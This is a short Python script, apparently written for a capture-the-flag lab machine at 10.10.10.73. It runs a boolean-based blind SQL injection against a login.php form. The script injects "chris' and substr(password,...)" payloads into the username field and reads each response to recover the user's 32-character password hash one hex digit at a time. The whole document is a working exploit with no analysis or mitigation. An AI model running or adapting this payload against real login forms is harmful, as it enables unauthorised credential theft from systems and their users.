import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

injectionURL = "http://10.10.10.73/login.php"

for i in range(1,33):
    for character in '0123456789abcdef':
        payload = "chris' and substr(password,%s,1) = '%s'-- -" % (i, character)

        data = {'username':payload, 'password':'password'}
        request = requests.post(injectionURL, verify=False, proxies=proxies, data=data)

        # If payload equals true, "Wrong identification"will appear on response
        if "Wrong" in request.text:
            print(character, end="", flush=True)
            break
